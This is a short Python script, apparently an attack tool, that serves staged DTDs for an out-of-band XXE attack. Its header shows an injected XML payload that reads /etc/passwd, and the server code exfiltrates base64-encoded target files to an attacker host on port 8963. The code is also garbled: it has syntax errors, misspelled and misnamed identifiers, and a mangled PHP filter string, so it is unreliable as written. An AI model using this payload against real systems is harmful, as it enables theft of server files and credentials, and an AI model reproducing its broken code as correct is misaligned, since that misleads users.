#!/usr/bin/env python
#
# description:
#
# this script can serve xml data to a xml parsing api and read files of the target upon executed parameter entity
# rather than serving xml or dtd files 
#
# target must support outofband connections via http
#
# you can manualy install dependencies with pip3
#
# the xml injected to the api should be somthing like this:
#
#  <?xml version="1.0" encoding="utf-8" ?>
#  <!DOCTYPE foo [ <!ENTITY foo ANY >
#    <!ENTITY % xxe SYSTEM 'http://attacker:8963/stage1.xml?/etc/passwd'>%xxe;param1;]>
# <xmldataparam>&exfil;</xmldataparam>
#
#
from http.server import BaseHTTPRequestHandler , HTTPServer
from base64 import b64decode

# HTTP Class
class HTTP_RequestHandler(BaseHTTPRequestHandler)
    def do_GET(self):
        stage, data = (self.path).split('?')
        if stage = '/stage1.xml':
            message = """<!ENTITY % data SYSTEM "php:/vert.base64-ncode/resource="""+ data +"""">
<!ENTITY % param1"<!ENTITY exfil SYSTEM 'http://attacker.com:8963/stage2.xml%data;'>">"""
        if stage = '/stage2.xml':
            message = ""
            print(base64decode(data).decode("utf-8"))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(bytes(message, 'utf-8')) #writting to actual console of the websever
        return
    def log_message(self, format, *args):
        return

#run the server
def run():
    print ("starting server")
    server_address('0.0.0.0' , 8963) #change these if want 
    httpd = HTTPServer(sever_address, HTTP_RequestHandler)
    httpd.serve_forever() #also this
run()
